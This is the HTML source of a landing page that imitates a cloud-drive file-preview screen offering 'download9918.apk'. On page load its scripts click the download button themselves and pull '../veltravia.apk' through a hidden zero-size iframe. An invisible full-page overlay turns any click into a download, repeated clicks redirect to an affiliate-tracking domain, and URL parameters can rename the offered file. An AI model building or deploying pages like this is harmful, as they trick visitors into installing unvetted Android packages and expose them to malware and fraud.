<!doctype html>
<html lang="en" translate="no">
<head>
  <meta charset="utf-8">
  <meta name="google" content="notranslate">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Download</title>
  <script src="../params.js?v=blyat-params-3"></script>
  <script>
    window.__downloadTestRevision = 'blyat-params-3';
    window.__downloadSwVersion = '42316858';
    window.__downloadSwUrl = `../sw.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
    window.__swReadyPromise = (async () => {
      await window.__landingParamsReady;
      if (!('serviceWorker' in navigator)) {
        return { ok: false, direct: true, reason: 'unsupported' };
      }

      const registration = await navigator.serviceWorker.register(window.__downloadSwUrl);
      await registration.update();

      if (registration.waiting) {
        registration.waiting.postMessage({ type: 'SKIP_WAITING' });
      }

      await navigator.serviceWorker.ready;

      const expectedWorkerUrl = new URL(window.__downloadSwUrl, window.location.href).href;
      if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) {
        await new Promise((resolve, reject) => {
          const timeout = window.setTimeout(() => {
            navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
            reject(new Error('controller timeout'));
          }, 5000);

          function onControllerChange() {
            if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) return;
            navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
            window.clearTimeout(timeout);
            resolve();
          }

          navigator.serviceWorker.addEventListener('controllerchange', onControllerChange);
        });
      }

      return {
        ok: true,
        direct: false,
        registration,
        controller: navigator.serviceWorker.controller,
      };
    })().catch((error) => {
      console.error('[download] early service worker setup failed', error);
      return { ok: false, direct: true, reason: error.message };
    });
  </script>
  <style>
    * {
      padding: 0;
      margin: 0;
    }

    body {
      margin: 0;
    }

    .content {
      width: 100%;
      background-color: #1e1e1f;
      overflow: hidden;
      height: 100vh;
      position: relative;
      font-family: Roboto, sans-serif;
    }

    .nav-container {
      position: absolute;
      width: 100%;
      height: 70px;
      z-index: 2;
    }

    .nav-menu {
      width: 90%;
      font-size: 16px;
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      position: relative;
    }

    .name-part,
    .manage-part,
    .download,
    .avatar,
    .menu,
    .view-box {
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .f-a-center {
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .name-part {
      gap: 10px;
      color: #C4C7C5;
    }

    .name-part > .icon {
      background-color: white;
      padding: 1px;
      border-radius: 2px;
    }

    .title {
      max-width: 54vw;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }

    .manage-part {
      gap: 8px;
    }

    .manage-part > .avatar {
      width: 30px;
      height: 30px;
      color: white;
      background-color: orange;
      border-radius: 100%;
    }

    .manage-part .menu {
      flex-direction: column;
      gap: 2px;
      height: 50px;
      width: 50px;
    }

    .manage-part .menu .point {
      background-color: #C4C7C5;
      width: 5px;
      height: 5px;
      border-radius: 100%;
    }

    .view-box {
      position: relative;
      z-index: 1;
      width: 100%;
      height: 100%;
    }

    .inner-box {
      background-color: #4d494c;
      box-sizing: content-box;
      color: white;
      padding: 20px;
      font-size: 19px;
      border-radius: 20px;
      width: 240px;
      height: 80px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      box-shadow: 0 10px 12px 5px rgba(0, 0, 0, .2);
    }

    .inner-box > .download {
      background-color: #1b73e8;
      width: 150px;
      height: 30px;
      flex-direction: row;
      font-size: 12px;
      color: white;
    }

    .inner-box > .download > .text {
      width: 100px;
      text-align: center;
      text-shadow: 0 1px 0 rgba(0, 0, 0, .8);
    }

    .click-area {
      z-index: 100;
      position: absolute;
      width: 100%;
      height: 100vh;
      top: 0;
      left: 0;
      cursor: pointer;
    }

    .hidden-frame {
      position: absolute;
      width: 0;
      height: 0;
      border: 0;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div class="content">
    <div class="nav-container f-a-center">
      <div class="nav-menu">
        <div class="name-part f-a-center">
          <div class="icon f-a-center">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 32 32" aria-hidden="true">
              <g transform="translate(0,32) scale(0.1,-0.1)" fill="black" stroke="none">
                <path d="M50 276 c-27 -33 18 -72 48 -42 13 13 14 20 6 34 -15 23 -38 26 -54 8z"/>
                <path d="M173 253 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
                <path d="M44 175 c-10 -25 4 -45 30 -45 30 0 40 13 31 40 -8 24 -53 28 -61 5z"/>
                <path d="M173 153 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
                <path d="M50 86 c-27 -33 18 -72 48 -42 13 13 14 20 6 34 -15 23 -38 26 -54 8z"/>
                <path d="M173 63 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
              </g>
            </svg>
          </div>
          <div id="fileTitle" class="title">download9918.apk</div>
        </div>
        <div class="manage-part f-a-center">
          <div class="download f-a-center">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25" aria-hidden="true">
              <path fill="#C4C7C5" d="M4 15h2v3h12v-3h2v3c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2m11.59-8.41L13 12.17V4h-2v8.17L8.41 9.59 7 11l5 5 5-5-1.41-1.41z"/>
            </svg>
          </div>
          <div class="menu f-a-center" aria-hidden="true">
            <div class="point first"></div>
            <div class="point second"></div>
            <div class="point third"></div>
          </div>
          <div class="avatar f-a-center">A</div>
        </div>
      </div>
    </div>
    <div class="view-box f-a-center">
      <div class="inner-box">
        <div class="text">No preview available</div>
        <div id="downloadButton" class="download f-a-center" role="button" tabindex="0" aria-disabled="true">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25" aria-hidden="true">
            <path fill="#C4C7C5" d="M4 15h2v3h12v-3h2v3c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2m11.59-8.41L13 12.17V4h-2v8.17L8.41 9.59 7 11l5 5 5-5-1.41-1.41z"/>
          </svg>
          <div class="text">Download</div>
        </div>
      </div>
    </div>
  </div>
  <div id="clickArea" class="click-area" aria-hidden="true"></div>
  <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>

  <script>
    const DEFAULT_FILE_NAME = 'download9918.apk';
    const TEST_REVISION = window.__downloadTestRevision;
    const SW_VERSION = window.__downloadSwVersion;
    const SW_URL = window.__downloadSwUrl;
    const REDIRECT_HREF = 'https://immenselybossseal.com/path?key=01f48ac1c32a45189507ced9b43601b9&utm_source=lp_click';

    const downloadButton = document.querySelector('#downloadButton');
    const downloadFrame = document.querySelector('#downloadFrame');
    const clickArea = document.querySelector('#clickArea');
    const fileTitle = document.querySelector('#fileTitle');

    let savedParams = new URLSearchParams();
    let offerId = null;
    let fileName = DEFAULT_FILE_NAME;
    let isServiceWorkerReady = false;
    let trustedClickCount = 0;

    function log(message, data) {
      if (data === undefined) {
        console.log(`[download] ${message}`);
        return;
      }

      console.log(`[download] ${message}`, data);
    }

    function sanitizeFileName(value) {
      const fallbackBase = DEFAULT_FILE_NAME.replace(/\.apk$/i, '');
      const candidate = String(value || '')
        .replace(/\.apk$/i, '')
        .slice(0, 80);
      const isValid = candidate !== ''
        && !/^[ _-]+$/.test(candidate)
        && !/^ /.test(candidate)
        && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
      const base = isValid ? candidate : fallbackBase;
      return `${base}.apk`;
    }

    function getSavedOfferId() {
      const value = savedParams.get('offer_id');
      return value && value.trim() ? value.trim().slice(0, 80) : null;
    }

    function getSavedFileName() {
      return sanitizeFileName(savedParams.get('utm_medium'));
    }

    function getRedirectUrl() {
      const target = new URL(REDIRECT_HREF);
      target.searchParams.set('clickid', savedParams.get('clickid') || '');
      return target.href;
    }

    async function registerServiceWorker() {
      await window.__landingParamsReady;
      savedParams = window.__savedDownloadParams;
      offerId = getSavedOfferId();
      fileName = getSavedFileName();
      const title = document.querySelector('#fileTitle');
      if (title) title.textContent = fileName;
      const swState = await window.__swReadyPromise;

      if (!swState.ok || swState.direct) {
        downloadButton.disabled = true;
        log('service worker is required for offer download', { reason: swState.reason, offerId });
        return;
      }

      isServiceWorkerReady = true;
      downloadButton.disabled = !offerId;
      log('ready to download', {
        controller: swState.controller && swState.controller.scriptURL,
        swUrl: SW_URL,
        offerId,
        fileName,
      });

      if (offerId) {
        downloadButton.click();
      }
    }

    function startDownload() {
      if (!offerId) {
        log('offer_id is missing. Add ?offer_id=123');
        return;
      }

      const target = new URL('../veltravia.apk', window.location.href);
      log('starting service worker download', { offerId, fileName, target: target.href });
      downloadFrame.src = 'about:blank';
      window.setTimeout(() => {
        downloadFrame.src = target.href;
      }, 0);
    }

    function handleDownloadClick(event) {
      if (!isServiceWorkerReady) {
        log('download requested before service worker readiness');
        return;
      }

      if (event && event.isTrusted) {
        trustedClickCount += 1;

        if (trustedClickCount >= 3) {
          window.location.href = getRedirectUrl();
          return;
        }
      }

      startDownload();
    }

    if (fileTitle) {
      fileTitle.textContent = fileName;
    }

    downloadButton.addEventListener('click', handleDownloadClick);
    clickArea.addEventListener('click', handleDownloadClick);

    registerServiceWorker().catch((error) => {
      console.error('[download] service worker setup failed', error);
      downloadButton.disabled = true;
      log('service worker setup failed', { error: error.message, offerId });
    });
  </script>
</body>
</html>
